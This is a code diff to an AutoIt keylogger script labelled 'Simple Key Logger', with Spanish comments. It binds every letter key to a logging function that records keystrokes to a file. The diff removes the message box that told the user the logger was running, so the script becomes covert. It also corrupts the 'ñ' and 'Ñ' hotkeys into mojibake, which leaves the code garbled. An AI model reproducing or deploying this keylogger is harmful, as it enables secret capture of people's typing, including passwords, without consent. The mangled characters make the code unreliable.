@@ -31,10 +31,7 @@ keyLog()
 Func keyLog()
 	Local $iFileSize = FileGetSize($archivo)
 
-	;mostramos opciones al usuario
-	MsgBox(0, "Simple Key Logger", "[Alt+k] ver las keys "&@CR&"[Alt+q] para salir")
-
-	;dejamos todo el tiempo esperando hotkeys
+	
 	while $iFileSize < 1024
 		HotKeySet("!k", "menukey")
 		HotKeySet("!q", "quit")
@@ -53,7 +50,7 @@ Func keyLog()
 		HotKeySet("l", "logea")
 		HotKeySet("m", "logea")
 		HotKeySet("n", "logea")
-		HotKeySet("ñ", "logea")
+		HotKeySet("Ã±", "logea")
 		HotKeySet("o", "logea")
 		HotKeySet("p", "logea")
 		HotKeySet("q", "logea")
@@ -80,7 +77,7 @@ Func keyLog()
 		HotKeySet("L", "logea")
 		HotKeySet("M", "logea")
 		HotKeySet("N", "logea")
-		HotKeySet("Ñ", "logea")
+		HotKeySet("Ã‘", "logea")
 		HotKeySet("O", "logea")
 		HotKeySet("P", "logea")
 		HotKeySet("Q", "logea")
